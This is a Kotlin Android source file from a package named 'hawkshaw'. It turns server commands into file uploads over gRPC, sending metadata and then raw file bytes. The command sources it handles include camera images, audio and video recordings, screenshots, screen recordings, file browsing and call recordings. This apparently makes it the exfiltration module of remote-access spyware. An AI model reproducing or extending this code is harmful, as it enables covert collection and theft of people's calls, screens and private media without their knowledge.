package com.hawkshaw.library.datalayer.network.service

import com.hawkshaw.library.FileServiceGrpcKt
import com.hawkshaw.library.FileUploadRequest
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.network.grpc.GrpcChannelKt
import com.hawkshaw.library.datalayer.network.grpc.grpcCall
import com.hawkshaw.library.datalayer.network.grpc.grpcCallFlow
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flowOf
import android.util.Log
// Import for ByteString is removed as setContent now expects ByteArray
// import com.google.protobuf.ByteString

/**
 * Kotlin utilities for the File Service that handles file uploads via gRPC.
 */
object FileServiceKt {
    private const val TAG = "FileServiceKtLogs"

    init {
        Log.d(TAG, "[DEBUG] FileServiceKt object initialized/accessed.")
    }

    /**
     * The FileService gRPC stub for making file-related calls.
     * FIXED: Access GrpcChannelKt.channel directly instead of GrpcChannelKt.getChannel()
     */
    private val fileService by lazy {
        Log.d(TAG, "[DEBUG] Initializing fileService gRPC stub...")
        val stub = FileServiceGrpcKt.FileServiceCoroutineStub(GrpcChannelKt.channel)
        Log.d(TAG, "[DEBUG] fileService gRPC stub initialized: $stub")
        stub
    }

    /**
     * Converts a Command.FileRequest.Source enum to a FileUploadRequest.MetaData.Source enum.
     * 
     * @param source The source type from the Command model
     * @return The corresponding source type for the FileUploadRequest model
     * @throws RuntimeException if the source type is not recognized
     */
    internal fun toSource(source: Command.FileRequest.Source): Int {
        Log.d(TAG, "[DEBUG] toSource called. Input source: $source")
        val result = when (source) {
            Command.FileRequest.Source.CameraImage -> 1
            Command.FileRequest.Source.VideoRecording -> 2
            Command.FileRequest.Source.AudioRecording -> 3
            Command.FileRequest.Source.Screenshot -> 4
            Command.FileRequest.Source.ScreenRecording -> 5
            Command.FileRequest.Source.FileExplorer -> 6
            Command.FileRequest.Source.CallRecording -> 7
            else -> 0
        }
        Log.d(TAG, "[DEBUG] toSource: Mapped '$source' to integer value: $result")
        return result
    }
    
    /**
     * Creates a FileUploadRequest.MetaData object from a Command.FileRequest.
     * 
     * @param request The file request from a Command
     * @return A MetaData object configured for use in FileUploadRequest
     */
    fun createMetaData(request: Command.FileRequest): FileUploadRequest {
        Log.d(TAG, "[DEBUG] createMetaData called. Input Command.FileRequest path: ${request.path}")
        val filename = request.path.substringAfterLast('/')
        val mimeType = "application/octet-stream" // Default mimeType
        Log.d(TAG, "[DEBUG] createMetaData: Extracted filename: '$filename', MimeType: '$mimeType'")

        val metadataProto = FileUploadRequest.MetaData.newBuilder()
            .setFilename(filename)
            .setMimeType(mimeType)
            .build()
        Log.d(TAG, "[DEBUG] createMetaData: Built FileUploadRequest.MetaData: $metadataProto")
            
        val fileUploadRequest = FileUploadRequest.newBuilder()
            .setMetadata(metadataProto) // Sets the 'oneof' payload to metadata
            .build()
        Log.d(TAG, "[DEBUG] createMetaData: Built FileUploadRequest (with metadata only): $fileUploadRequest")
        return fileUploadRequest
    }

    /**
     * Uploads a file to the server by sending metadata first, then the file content.
     * 
     * @param fileBytes The file content as a ByteArray.
     * @param metadataMessage A FileUploadRequest message that already contains the metadata.
     * @return The server's response flow to the file upload.
     */
    suspend fun uploadFile(fileBytes: ByteArray, metadataMessage: FileUploadRequest): Flow<com.hawkshaw.library.FileUploadResponse> = grpcCall {
        Log.d(TAG, "[DEBUG] uploadFile suspend function called. fileBytes size: ${fileBytes.size}, metadataMessage: $metadataMessage")

        // Validate that the incoming metadataMessage actually contains metadata
        if (!metadataMessage.hasMetadata()) {
            // Removed .payloadCase from the log message as it was causing an unresolved reference
            val errorMsg = "Input metadataMessage does not contain metadata!"
            Log.e(TAG, "[DEBUG] uploadFile: $errorMsg")
            throw IllegalArgumentException(errorMsg)
        }
        Log.d(TAG, "[DEBUG] uploadFile: Validated metadataMessage contains metadata: ${metadataMessage.getMetadata()}")

        // Create the FileUploadRequest.File part
        val fileProto = FileUploadRequest.File.newBuilder()
            .setContent(fileBytes) // Corrected: setContent expects ByteArray directly
            .build()
        Log.d(TAG, "[DEBUG] uploadFile: Built FileUploadRequest.File. Content size: ${fileBytes.size}")
            
        // Create the FileUploadRequest message for the file content part
        val fileContentMessage = FileUploadRequest.newBuilder()
            .setFile(fileProto) // This sets the 'oneof' payload to file
            .build()
        Log.d(TAG, "[DEBUG] uploadFile: Built FileUploadRequest for file content: $fileContentMessage")
            
        // Create a flow that first sends the metadata message, then the file content message
        val requestStream = flowOf(metadataMessage, fileContentMessage)
        Log.d(TAG, "[DEBUG] uploadFile: Calling fileService.uploadFile with request stream (metadata then file content).")

        val responseFlow = fileService.uploadFile(requestStream)
        Log.d(TAG, "[DEBUG] uploadFile: fileService.uploadFile call initiated. Response (as Flow): $responseFlow")
        responseFlow // Return the Flow<FileUploadResponse>
    }
}

